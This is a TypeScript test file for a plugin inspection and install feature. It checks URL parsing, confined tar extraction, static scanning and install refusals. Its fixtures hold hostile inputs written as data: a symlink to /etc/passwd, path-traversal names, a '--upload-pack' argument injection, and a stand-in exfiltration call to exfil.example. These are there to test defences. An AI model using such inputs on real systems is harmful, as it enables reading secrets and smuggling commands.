/**
 * Inspect from URL (#399): URL parsing, ref resolution, the confined tar
 * reader and its caps, the static scan against all four example plugins, the
 * declared-vs-used mismatches, and the install route's refusals and sha pin.
 *
 * No network: `FetchDeps` is replaced by a fake whose "GitHub" serves a tar
 * built from `examples/plugins/*` as the repository would hold them (build
 * output listed in each example's .gitignore left out).
 */
import { afterEach, describe, expect, it } from "vitest";
import { mkdir, mkdtemp, readdir, rm, symlink, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { FastifyInstance } from "fastify";
import type { PluginInfo, PluginInspection } from "@dispatch/shared";
import { buildApp } from "../../app.js";
import { EventBus } from "../../bus.js";
import { Store } from "../../store/index.js";
import { DEFAULT_FETCH_LIMITS, fetchPlugin, type FetchDeps, type FetchLimits } from "./fetch.js";
import { PluginInspector } from "./index.js";
import { inspectPluginDir, readmeExcerpt, compareVersions } from "./inspect.js";
import { scanText, runtimeNpmImports, stripComments } from "./scan.js";
import { extractTar, unsafeEntryName } from "./tar.js";
import { chunked, entriesFromDir, gzip, makeTar, type TarEntry } from "./test-tar.js";
import { PluginInspectError, parseLsRemote, parsePluginUrl, resolvePluginRef } from "./url.js";

const here = dirname(fileURLToPath(import.meta.url));
const EXAMPLES = resolve(here, "../../../../../examples/plugins");

const SHA_MAIN = "a".repeat(40);
const SHA_FEAT = "b".repeat(40);
const SHA_TAG_OBJ = "c".repeat(40);
const SHA_TAG = "d".repeat(40);
const LS_REMOTE = [
  `ref: refs/heads/main\tHEAD`,
  `${SHA_MAIN}\tHEAD`,
  `${SHA_MAIN}\trefs/heads/main`,
  `${SHA_FEAT}\trefs/heads/feat/x`,
  `${SHA_TAG_OBJ}\trefs/tags/v1.0.0`,
  `${SHA_TAG}\trefs/tags/v1.0.0^{}`,
].join("\n");

const dirs: string[] = [];
const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.splice(0).map((a) => a.close().catch(() => {})));
  await Promise.all(dirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

async function tmp(prefix = "dispatch-inspect-test-"): Promise<string> {
  const d = await mkdtemp(join(tmpdir(), prefix));
  dirs.push(d);
  return d;
}

/** The four examples as one monorepo tarball at `sha`, the way codeload wraps it. */
async function exampleRepoTar(sha: string): Promise<Buffer> {
  const prefix = `mdennis281-dispatch-${sha.slice(0, 7)}`;
  const entries: TarEntry[] = [{ name: `${prefix}/README.md`, body: "# Dispatch\n" }];
  for (const name of (await readdir(EXAMPLES)).sort()) {
    entries.push(...(await entriesFromDir(join(EXAMPLES, name), `${prefix}/examples/plugins/${name}`)));
  }
  return makeTar(entries, { comment: sha });
}

/** Fake network: ls-remote answers {@link LS_REMOTE}; "GitHub" serves `tarFor(sha)`. */
function fakeDeps(tarFor: (sha: string) => Promise<Buffer> | Buffer, seen: string[] = []): FetchDeps {
  return {
    lsRemote: async () => LS_REMOTE,
    githubTarball: async (_o, _r, sha) => {
      seen.push(sha);
      return chunked(gzip(await tarFor(sha)));
    },
    gitArchive: async (_u, sha) => {
      seen.push(sha);
      return chunked(await tarFor(sha));
    },
  };
}

async function inspectExample(name: string): Promise<PluginInspection> {
  const inspector = new PluginInspector({
    configDir: await tmp(),
    hostInfo: () => undefined,
    noteInstalled: async () => undefined,
    fetchDeps: fakeDeps(exampleRepoTar),
  });
  return inspector.inspect(`https://github.com/mdennis281/dispatch/tree/main/examples/plugins/${name}`);
}

const labels = (r: PluginInspection, kind?: string) => r.hooks.filter((h) => !kind || h.kind === kind).map((h) => h.label);

/* ------------------------------------------------------------------ URLs */

describe("parsePluginUrl", () => {
  it("reads the GitHub forms", () => {
    expect(parsePluginUrl("https://github.com/o/r")).toMatchObject({ host: "github", repo: "o/r", cloneUrl: "https://github.com/o/r.git", refPath: [], blob: false });
    expect(parsePluginUrl("github.com/o/r.git")).toMatchObject({ repo: "o/r", refPath: [] });
    expect(parsePluginUrl("git@github.com:o/r.git")).toMatchObject({ repo: "o/r", cloneUrl: "https://github.com/o/r.git" });
    expect(parsePluginUrl("https://github.com/o/r/tree/feat/x/plugins/a")).toMatchObject({ refPath: ["feat", "x", "plugins", "a"], blob: false });
    expect(parsePluginUrl("https://github.com/o/r/blob/main/p/plugin.yaml?plain=1#L3")).toMatchObject({ refPath: ["main", "p", "plugin.yaml"], blob: true });
  });

  it("reads another host's clone URL with an optional #ref", () => {
    expect(parsePluginUrl("https://gitlab.com/g/sub/r.git#v2")).toMatchObject({ host: "git", repo: "gitlab.com/g/sub/r", cloneUrl: "https://gitlab.com/g/sub/r.git", refPath: ["v2"] });
  });

  it.each([
    ["http://github.com/o/r", /only https/],
    ["https://user:tok@github.com/o/r", /credentials/],
    ["--upload-pack=x", /paste a GitHub/],
    ["https://github.com/o", /owner and a repository/],
    ["https://github.com/o/r/pulls", /unsupported GitHub URL/],
    ["https://github.com/o/r/tree/main/a%5Cb", /unsafe path segment/],
    ["https://gitlab.com/g/r/-/tree/main/x", /web page URL/],
    ["file:///etc/passwd", /only https/],
  ])("refuses %s", (url, why) => {
    expect(() => parsePluginUrl(url)).toThrow(why);
  });
});

describe("resolvePluginRef", () => {
  const remote = parseLsRemote(LS_REMOTE);
  const at = (url: string) => resolvePluginRef(parsePluginUrl(url), remote);

  it("defaults to the remote's HEAD branch at the root", () => {
    expect(at("https://github.com/o/r")).toEqual({ ref: "main", sha: SHA_MAIN, subdir: "" });
  });
  it("splits a slashed branch from the subdir by the LONGEST matching ref", () => {
    expect(at("https://github.com/o/r/tree/feat/x/plugins/a")).toEqual({ ref: "feat/x", sha: SHA_FEAT, subdir: "plugins/a" });
  });
  it("takes an annotated tag's peeled commit, not the tag object", () => {
    expect(at("https://github.com/o/r/tree/v1.0.0")).toEqual({ ref: "v1.0.0", sha: SHA_TAG, subdir: "" });
  });
  it("uses a /blob/ file's directory", () => {
    expect(at("https://github.com/o/r/blob/main/examples/p/plugin.yaml").subdir).toBe("examples/p");
  });
  it("accepts a full sha, refuses an abbreviated one, and 404s an unknown ref", () => {
    const sha = "e".repeat(40);
    expect(at(`https://github.com/o/r/tree/${sha}/p`)).toEqual({ ref: sha, sha, subdir: "p" });
    expect(() => at("https://github.com/o/r/tree/abc1234/p")).toThrow(/full 40-character/);
    expect(() => at("https://github.com/o/r/tree/nope/p")).toThrow(/no branch or tag named "nope"/);
  });
});

/* ------------------------------------------------------------------- tar */

describe("extractTar — caps and confinement", () => {
  const caps = { maxFiles: 10, maxBytes: 1000, maxFileBytes: 500 };
  const run = async (entries: TarEntry[], over: Partial<typeof caps> = {}, subdir = "") => {
    const dest = join(await tmp(), "out");
    const res = await extractTar(chunked(makeTar(entries), 100), { dest, strip: 1, subdir, caps: { ...caps, ...over } });
    return { dest, res };
  };

  it("writes files, skips links and unsafe names, never leaves dest", async () => {
    const { dest, res } = await run([
      { name: "w/plugin.yaml", body: "id: x\n" },
      { name: "w/link", type: "2", linkname: "/etc/passwd" },
      { name: "w/hard", type: "1", linkname: "w/plugin.yaml" },
      { name: "w/../escape.txt", body: "no" },
      { name: "w/sub/a:stream", body: "ads" },
      { name: "w/CON", body: "dev" },
      { name: "w/node_modules/x/index.js", body: "dep" },
      { name: `w/${"deep/".repeat(30)}f.txt`, body: "long pax name" },
    ]);
    expect(existsSync(join(dest, "plugin.yaml"))).toBe(true);
    expect(existsSync(join(dest, "link"))).toBe(false);
    expect(existsSync(join(dest, "..", "escape.txt"))).toBe(false);
    expect(existsSync(join(dest, "node_modules"))).toBe(false);
    expect(existsSync(join(dest, ...Array(30).fill("deep"), "f.txt"))).toBe(true);
    expect(res.skipped).toEqual(
      expect.arrayContaining([
        "link (symlink)",
        "hard (hard link)",
        "../escape.txt (dot segment)",
        "sub/a:stream (reserved character)",
        "CON (Windows device name)",
      ]),
    );
    expect(res.files).toBe(2);
  });

  it("refuses past the file-count, total-byte and per-file caps", async () => {
    const many = Array.from({ length: 11 }, (_, i) => ({ name: `w/f${i}`, body: "x" }));
    await expect(run(many)).rejects.toMatchObject({ status: 413, message: expect.stringMatching(/more than 10 files/) });
    const big = Array.from({ length: 3 }, (_, i) => ({ name: `w/f${i}`, body: "x".repeat(400) }));
    await expect(run(big)).rejects.toThrow(/larger than 1000 bytes/);
    await expect(run([{ name: "w/huge", body: "x".repeat(600) }])).rejects.toThrow(/per-file limit/);
  });

  it("keeps only the subdir, and does not count what it skipped against the caps", async () => {
    const outside = Array.from({ length: 50 }, (_, i) => ({ name: `w/other/f${i}`, body: "y".repeat(400) }));
    const { dest, res } = await run([...outside, { name: "w/p/plugin.yaml", body: "id: p\n" }], {}, "p");
    expect(await readdir(dest)).toEqual(["plugin.yaml"]);
    expect(res.files).toBe(1);
    expect(res.manifestDirs).toEqual(["p"]);
  });

  it("names unsafe entry names", () => {
    expect(unsafeEntryName("a/b.js")).toBeNull();
    expect(unsafeEntryName("/abs")).toBe("absolute path");
    expect(unsafeEntryName("C:/x")).toBe("absolute path");
    expect(unsafeEntryName("a\\b")).toBe("backslash in name");
    expect(unsafeEntryName("a/b. ")).toBe("trailing dot or space");
  });
});

describe("fetchPlugin", () => {
  it("pins the sha, verifies GitHub's stamped commit, and points at other manifests when the dir has none", async () => {
    const seen: string[] = [];
    const deps = fakeDeps(exampleRepoTar, seen);
    const f = await fetchPlugin("https://github.com/mdennis281/dispatch/tree/main/examples/plugins/hello-server", { deps, pinSha: SHA_FEAT });
    dirs.push(f.scratch);
    expect(seen).toEqual([SHA_FEAT]);
    expect(f).toMatchObject({ ref: "main", sha: SHA_FEAT, subdir: "examples/plugins/hello-server" });

    const lying = fakeDeps(() => exampleRepoTar(SHA_TAG));
    await expect(fetchPlugin("https://github.com/mdennis281/dispatch", { deps: lying })).rejects.toThrow(/served commit dddddd/);

    await expect(fetchPlugin("https://github.com/mdennis281/dispatch", { deps })).rejects.toThrow(
      /no plugin\.yaml at the repository root .* found one in: examples\/plugins\/contributions/,
    );
  });

  it("stops a download past the byte cap", async () => {
    const limits: FetchLimits = { ...DEFAULT_FETCH_LIMITS, maxDownloadBytes: 1000 };
    await expect(
      fetchPlugin("https://github.com/mdennis281/dispatch/tree/main/examples/plugins/hello-server", { deps: fakeDeps(exampleRepoTar), limits }),
    ).rejects.toMatchObject({ status: 413 });
  });
});

/* ----------------------------------------------------------- the examples */

describe("the four example plugins", () => {
  it("hello-server: server routes, a bus listener and kv, all declared and all used", async () => {
    const r = await inspectExample("hello-server");
    expect(r).toMatchObject({
      valid: true,
      installable: true,
      id: "hello-server",
      name: "Hello (server)",
      version: "0.1.0",
      compatibility: { range: ">=1", hostApi: 1, compatible: true },
      entries: { server: { path: "server/index.js", present: true } },
      source: { host: "github", repo: "mdennis281/dispatch", ref: "main", sha: SHA_MAIN, subdir: "examples/plugins/hello-server" },
      mismatches: { undeclared: [], unused: [] },
    });
    expect(r.capabilities.map((c) => [c.name, c.used])).toEqual([["events", true], ["routes", true], ["kv", true]]);
    expect(labels(r, "event")).toContain('bus.on("chat-message")');
    expect(labels(r, "route")).toEqual(["GET /chats/:chatId", "GET /hello", "POST /echo"]);
    expect(labels(r, "api")).toEqual(expect.arrayContaining(["kv.get", "kv.set"]));
    expect(r.settingsSchema).toMatchObject({ properties: expect.any(Object) });
    expect(r.readme?.excerpt).toBeTruthy();
    expect(r.source.browseUrl).toBe(`https://github.com/mdennis281/dispatch/tree/${SHA_MAIN}/examples/plugins/hello-server`);
  });

  it("hello-slot: every client slot it registers, its routes, and the unbuilt client entry", async () => {
    const r = await inspectExample("hello-slot");
    expect(r.valid).toBe(true);
    expect(r.entries).toEqual({
      server: { path: "server/index.js", present: true },
      client: { path: "client/index.js", present: false },
    });
    expect(r.warnings[0]).toMatch(/client entry client\/index\.js is not in the repository .* build output/);
    expect(labels(r, "slot")).toEqual(["chatBadge", 'composerControl "hello"', 'settingsSection "hello"', "toast"]);
    expect(labels(r, "route")).toEqual(["GET /hello", "POST /ping"]);
    expect(labels(r, "event")).toEqual(expect.arrayContaining(['events.on("chat-update")', 'events.on("chat-status")', "events.onPlugin — its own plugin-events"]));
    expect(labels(r, "chat")).toEqual(expect.arrayContaining(["chat.ext — writes per-chat state", "chat.ext — reads per-chat state"]));
    expect(labels(r, "api")).toEqual(expect.arrayContaining(['api.fetch("ping") — its own routes']));
    expect(r.mismatches).toEqual({ undeclared: [], unused: [] });
    expect(r.scan.files).toEqual(["server/index.js", "src/index.tsx"]);
  });

  it("event-forwarder: scans src/ when the built server is not committed, and finds the outbound fetch", async () => {
    const r = await inspectExample("event-forwarder");
    expect(r.entries.server).toEqual({ path: "server/index.js", present: false });
    expect(r.scan.files).toEqual(["src/server.ts"]);
    expect(labels(r, "event")).toContain("bus.subscribe — every event");
    expect(labels(r, "route")).toEqual(["GET /status", "POST /test"]);
    expect(labels(r, "api")).toEqual(expect.arrayContaining(["kv.get", "kv.set", "secrets.get"]));
    expect(labels(r, "io")).toContain("fetch — outbound HTTP (URL not literal)");
    expect(r.capabilities.every((c) => c.used === true)).toBe(true);
    expect(r.mismatches).toEqual({ undeclared: [], unused: [] });
    expect(r.secrets).toEqual(["EVENT_FORWARDER_SECRET"]);
  });

  it("contributions: one of each contribution, the code its MCP server and process run, no mismatch", async () => {
    const r = await inspectExample("contributions");
    expect(r.entries).toEqual({});
    expect(r.contributions).toMatchObject({
      skills: ["plugin-hello"],
      instructions: ["contributions-plugin"],
      personas: ["plugin-reviewer"],
      mcpServers: [{ name: "contrib-echo", transport: "stdio", command: "node", args: ["./mcp/echo-server.mjs"], env: ["ECHO_TOKEN"] }],
      processes: [{ id: "hello-http", name: "Hello HTTP", command: "node", args: ["./process/server.mjs"], ports: [47311], autostart: true, singleton: true }],
    });
    expect(r.contributions.modes).toHaveLength(1);
    expect(r.scan.files).toEqual(["mcp/echo-server.mjs", "process/server.mjs"]);
    expect(labels(r, "io")).toEqual(expect.arrayContaining(["http — makes or serves network connections", "process.env — reads environment variables"]));
    expect(r.capabilities.map((c) => [c.name, c.used])).toEqual([["mcp", true], ["process", true]]);
    expect(r.mismatches).toEqual({ undeclared: [], unused: [] });
  });
});

/* ------------------------------------------------------------ mismatches */

async function writeDir(files: Record<string, string>): Promise<string> {
  const d = await tmp();
  for (const [rel, body] of Object.entries(files)) {
    await mkdir(dirname(join(d, rel)), { recursive: true });
    await writeFile(join(d, rel), body);
  }
  return d;
}
const SOURCE = { url: "x", host: "github" as const, repo: "o/r", cloneUrl: "x", ref: "main", sha: SHA_MAIN, subdir: "" };
const FETCHED = { files: 0, bytes: 0, skipped: [] };

describe("declared vs used", () => {
  it("reports a used-but-undeclared capability with why, and a declared-but-unused one", async () => {
    const dir = await writeDir({
      "plugin.yaml": "id: m\nname: M\nversion: 1.0.0\ndispatch: '>=1'\nserver: ./server/index.js\ncapabilities: [routes, memory]\n",
      "server/index.js": [
        "export async function activate(context) {",
        "  context.routes((r) => r.get('/x', () => 1));",
        "  await context.chats.send('id', 'hi');",
        "  await context?.kv!.set('k', 1);",
        "  const t = await context.secrets.get('UNLISTED');",
        "  // ctx.attention.answer('x') — in a comment, so not a use",
        "}",
      ].join("\n"),
    });
    const r = await inspectPluginDir(dir, { source: SOURCE, fetched: FETCHED });
    expect(r.mismatches.undeclared).toEqual([
      { capability: "chats:write", because: ["chats.send"] },
      { capability: "secrets", because: ['secrets.get("UNLISTED")'] },
      { capability: "kv", because: ["kv.set"] },
    ]);
    expect(r.mismatches.unused).toEqual(["memory"]);
    expect(r.warnings.join("\n")).toMatch(/secret\(s\) not listed under secrets: UNLISTED/);
    expect(labels(r)).not.toContain("attention.answer");
  });

  it("flags a client without `ui`, contributions without their capability, and a server bundle with npm imports", async () => {
    const dir = await writeDir({
      "plugin.yaml": [
        "id: n",
        "name: N",
        "version: 1.0.0",
        "dispatch: '>=1'",
        "server: ./server/index.js",
        "client: ./client/index.js",
        "capabilities: [events]",
        "contributes:",
        "  mcpServers: ./mcp.yaml",
      ].join("\n"),
      "server/index.js": "import express from 'express';\nexport function activate(ctx) {}\n",
      "client/index.js": "export default { activate(host) { host.toast('hi'); } }\n",
      "mcp.yaml": "- name: dispatch-evil\n  transport: { type: stdio, command: node, args: ['${secret:NOPE}'] }\n",
    });
    const r = await inspectPluginDir(dir, { source: SOURCE, fetched: FETCHED });
    expect(r.mismatches.undeclared.map((u) => u.capability)).toEqual(["mcp", "ui"]);
    expect(r.mismatches.unused).toEqual(["events"]);
    const w = r.warnings.join("\n");
    expect(w).toMatch(/server\/index\.js imports express at runtime/);
    expect(w).toMatch(/reserved/);
    expect(w).toMatch(/secret\(s\) not listed under secrets: NOPE/);
  });

  it("an invalid or incompatible manifest is reported with the host's own errors and is not installable", async () => {
    const bad = await writeDir({ "plugin.yaml": "id: dispatch-x\nname: X\nversion: one\ndispatch: '>=1'\n" });
    const r = await inspectPluginDir(bad, { source: SOURCE, fetched: FETCHED });
    expect(r.valid).toBe(false);
    expect(r.installable).toBe(false);
    expect(r.errors.join("\n")).toMatch(/id: ids starting with "dispatch-" are reserved/);
    expect(r.errors.join("\n")).toMatch(/version: version must be semver/);
    expect(r.id).toBe("dispatch-x");

    const future = await writeDir({ "plugin.yaml": "id: f\nname: F\nversion: 1.0.0\ndispatch: '>=99'\n" });
    const f = await inspectPluginDir(future, { source: SOURCE, fetched: FETCHED });
    expect(f).toMatchObject({ valid: true, installable: false, compatibility: { compatible: false } });
    expect(f.refusal).toMatch(/built for plugin API ">=99"/);
  });

  it("never turns an INVALID manifest's id into an installed-lookup path", async () => {
    const dir = await writeDir({ "plugin.yaml": "id: ../../../etc\nname: X\nversion: bad\ndispatch: '>=1'\n" });
    const asked: string[] = [];
    const r = await inspectPluginDir(dir, { source: SOURCE, fetched: FETCHED, installed: async (id) => (asked.push(id), { version: "9.9.9" }) });
    expect(r.valid).toBe(false);
    expect(asked).toEqual([]);
    expect(r.installed).toBeUndefined();
  });

  it("does not follow a symlink out of the plugin directory", async () => {
    const outside = await writeDir({ "secret.js": "fetch('https://exfil.example/')" });
    const dir = await writeDir({ "plugin.yaml": "id: s\nname: S\nversion: 1.0.0\ndispatch: '>=1'\nserver: ./src/index.js\n", "src/index.js": "export function activate(ctx) {}\n" });
    try {
      await symlink(join(outside, "secret.js"), join(dir, "src", "linked.js"));
    } catch {
      return; // no symlink privilege (Windows without developer mode): nothing to prove here
    }
    const r = await inspectPluginDir(dir, { source: SOURCE, fetched: FETCHED });
    expect(r.scan.files).toEqual(["src/index.js"]);
    expect(labels(r, "io")).toEqual([]);
  });
});

describe("scan helpers", () => {
  it("strips comments but keeps strings and line numbers", () => {
    const src = 'const a = "// not a comment"; // ctx.kv.get(\n/* ctx.bus.on("x") */ ctx.kv.set("k")';
    const out = stripComments(src);
    expect(out).toContain('"// not a comment"');
    expect(out).not.toContain("ctx.kv.get");
    expect(scanText(src).map((h) => [h.label, h.line])).toEqual([["kv.set", 2]]);
  });
  it("follows a bundler-renamed activate parameter", () => {
    expect(scanText("var p={async activate(e){e.bus.on('chat-status',()=>{})}};").map((h) => h.label)).toEqual(['bus.on("chat-status")']);
  });
  it("finds bare runtime imports, ignoring node builtins and relative paths", () => {
    expect(runtimeNpmImports('import a from "lodash";\nimport { x } from "./x.js";\nimport fs from "node:fs";\nimport "path";\nconst y = require("left-pad");')).toEqual(["lodash", "left-pad"]);
  });
  it("excerpts a README and compares versions", () => {
    expect(readmeExcerpt("# Title\n[![badge](x)](y)\n\nFirst **bold**\nwrapped `para`.\n\n## Usage\n\n- a [link](u)\n- b\n\n## Other\n\nNo.")).toBe(
      "First bold wrapped para.\n\nUsage\n\n- a link\n- b",
    );
    expect(readmeExcerpt("<!<!---->-- hi -->Para.")).toBe("Para.");
    expect(compareVersions("1.2.0", "1.10.0")).toBe(-1);
    expect(compareVersions("1.0.0", "1.0.0-beta")).toBe(1);
  });
});

/* ---------------------------------------------------------------- routes */

async function app(fetchDeps: FetchDeps, seed?: (configDir: string) => Promise<void>) {
  const base = await tmp("dispatch-inspect-app-");
  const configDir = join(base, "config");
  const dataDir = join(base, "data");
  await mkdir(join(configDir, "plugins"), { recursive: true });
  await mkdir(dataDir, { recursive: true });
  await seed?.(configDir);
  let host: { get(id: string): PluginInfo | undefined; noteInstalled(id: string): Promise<PluginInfo | undefined> } | undefined;
  const instance = await buildApp({
    store: new Store(dataDir, configDir),
    bus: new EventBus(),
    config: { port: 0, host: "127.0.0.1", dataDir, configDir, maxActiveSessions: 1, idleSessionMinutes: 30 },
    serviceOverrides: {
      pluginInspector: new PluginInspector({
        configDir,
        hostInfo: (id) => host?.get(id),
        noteInstalled: async (id) => host?.noteInstalled(id),
        fetchDeps,
      }),
    },
  });
  host = instance.services.plugins;
  apps.push(instance);
  return { instance, configDir };
}

describe("POST /api/plugins/inspect + /install", () => {
  const url = "https://github.com/mdennis281/dispatch/tree/main/examples/plugins/hello-server";

  it("inspects, then installs exactly the inspected sha and flags the row for restart", async () => {
    const seen: string[] = [];
    const { instance, configDir } = await app(fakeDeps(exampleRepoTar, seen));
    const res = await instance.inject({ method: "POST", url: "/api/plugins/inspect", payload: { url } });
    expect(res.statusCode).toBe(200);
    const report = res.json() as PluginInspection;
    expect(report.installed).toBeUndefined();

    const inst = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_FEAT } });
    expect(inst.statusCode).toBe(200);
    expect(inst.json()).toMatchObject({ id: "hello-server", outcome: "copied", sha: SHA_FEAT, needsRestart: true, plugin: { id: "hello-server", needsRestart: true } });
    // The pin wins over the ref: `main` resolves to SHA_MAIN, but SHA_FEAT is what was fetched.
    expect(seen).toEqual([SHA_MAIN, SHA_FEAT]);
    expect(existsSync(join(configDir, "plugins", "hello-server", "server", "index.js"))).toBe(true);

    const rows = (await instance.inject({ url: "/api/plugins" })).json() as PluginInfo[];
    expect(rows.find((p) => p.id === "hello-server")).toMatchObject({ needsRestart: true });

    // Now present: the report says so, and a second install without `replace` is refused.
    const again = (await instance.inject({ method: "POST", url: "/api/plugins/inspect", payload: { url } })).json() as PluginInspection;
    expect(again.installed).toMatchObject({ version: "0.1.0", comparison: "same", needsRestart: true });
    const dup = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_MAIN } });
    expect(dup.statusCode).toBe(409);
    expect(dup.json().error).toMatch(/already installed/);
    const upd = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_MAIN, replace: true } });
    expect(upd.json()).toMatchObject({ outcome: "replaced" });
  });

  it("refuses malformed input and an invalid plugin", async () => {
    const broken = (sha: string) =>
      makeTar([{ name: "o-r-x/plugin.yaml", body: "id: dispatch-bad\nname: B\nversion: 1.0.0\ndispatch: '>=1'\n" }], { comment: sha });
    const { instance, configDir } = await app(fakeDeps(broken));
    expect((await instance.inject({ method: "POST", url: "/api/plugins/inspect", payload: {} })).statusCode).toBe(400);
    expect((await instance.inject({ method: "POST", url: "/api/plugins/inspect", payload: { url: "http://x" } })).statusCode).toBe(400);
    const short = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url: "https://github.com/o/r", sha: "abc1234" } });
    expect(short.statusCode).toBe(400);
    expect(short.json().error).toMatch(/40-character/);
    const invalid = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url: "https://github.com/o/r", sha: SHA_MAIN } });
    expect(invalid.statusCode).toBe(409);
    expect(invalid.json().error).toMatch(/not installable: the manifest is invalid/);
    expect(await readdir(join(configDir, "plugins"))).toEqual([]);
  });

  it("stops serving an active plugin's client bundle once its files are replaced, until restart", async () => {
    const manifest = (v: string) => `id: hello-server\nname: H\nversion: ${v}\ndispatch: '>=1'\nclient: ./client/index.js\ncapabilities: [ui]\n`;
    const seed = async (configDir: string) => {
      const dir = join(configDir, "plugins", "hello-server");
      await mkdir(join(dir, "client"), { recursive: true });
      await writeFile(join(dir, "plugin.yaml"), manifest("0.0.1"));
      await writeFile(join(dir, "client", "index.js"), "export default { activate() {} };\n");
    };
    const { instance } = await app(fakeDeps(exampleRepoTar), seed);
    await instance.services.plugins.activateAll();
    const before = ((await instance.inject({ url: "/api/plugins" })).json() as PluginInfo[])[0]!;
    expect(before).toMatchObject({ status: "active", clientUrl: "/plugins/hello-server/index.js" });
    expect((await instance.inject({ url: "/plugins/hello-server/index.js" })).statusCode).toBe(200);

    const upd = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_MAIN, replace: true } });
    expect(upd.json()).toMatchObject({ outcome: "replaced", plugin: { status: "active", needsRestart: true } });
    const after = ((await instance.inject({ url: "/api/plugins" })).json() as PluginInfo[])[0]!;
    expect(after.clientUrl).toBeUndefined();
    expect((await instance.inject({ url: "/plugins/hello-server/index.js" })).statusCode).toBe(404);
  });

  it("does not flag a switched-off plugin for restart when its files are replaced", async () => {
    const seed = async (configDir: string) => {
      const dir = join(configDir, "plugins", "hello-server");
      await mkdir(dir, { recursive: true });
      await writeFile(join(dir, "plugin.yaml"), "id: hello-server\nname: H\nversion: 0.0.1\ndispatch: '>=1'\n");
      await writeFile(join(configDir, "config.json"), JSON.stringify({ plugins: { "hello-server": { enabled: false } } }));
    };
    const { instance } = await app(fakeDeps(exampleRepoTar), seed);
    const upd = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_MAIN, replace: true } });
    expect(upd.json().plugin).toMatchObject({ status: "disabled", enabled: false });
    expect(upd.json().plugin.needsRestart).toBeUndefined();
  });

  it("maps a fetch failure to its status instead of a 500", async () => {
    const deps: FetchDeps = {
      ...fakeDeps(exampleRepoTar),
      lsRemote: async () => {
        throw new PluginInspectError("repository not found, or it is private — only public repositories can be inspected", 502);
      },
    };
    const { instance } = await app(deps);
    const res = await instance.inject({ method: "POST", url: "/api/plugins/inspect", payload: { url: "https://github.com/o/missing" } });
    expect(res.statusCode).toBe(502);
    expect(res.json().error).toMatch(/not found, or it is private/);
  });
});
